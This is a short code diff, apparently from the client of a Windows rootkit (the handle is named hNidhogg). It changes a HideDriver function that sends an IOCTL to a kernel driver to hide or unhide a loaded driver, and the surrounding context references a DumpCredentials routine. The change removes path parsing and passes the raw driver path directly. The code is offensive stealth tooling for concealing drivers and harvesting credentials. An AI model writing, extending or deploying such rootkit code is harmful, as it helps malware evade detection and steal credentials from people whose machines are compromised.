@@ -406,20 +406,11 @@ CredentialsInformation MemoryHandler::DumpCredentials() {
  */
 bool MemoryHandler::HideDriver(_In_ std::wstring driverPath, _In_ bool hide) {
 	DWORD returned = 0;
-	std::wstring parsedDriverName = L"";
 	IoctlHiddenDriverInfo driverInfo{};
 
 	if (!IsValidPath(driverPath))
 		return false;
-
-	try {
-		parsedDriverName = ParsePath<std::wstring, std::wstring>(driverPath);
-	}
-	catch (const PathHelperException& e) {
-		std::cerr << e.what() << std::endl;
-		return false;
-	}
-	driverInfo.DriverName = parsedDriverName.data();
+	driverInfo.DriverName = driverPath.data();
 	driverInfo.Hide = hide;
 	return DeviceIoControl(*hNidhogg.get(), IOCTL_HIDE_UNHIDE_DRIVER, &driverInfo, sizeof(driverInfo), nullptr, 0, &returned, nullptr);
 }
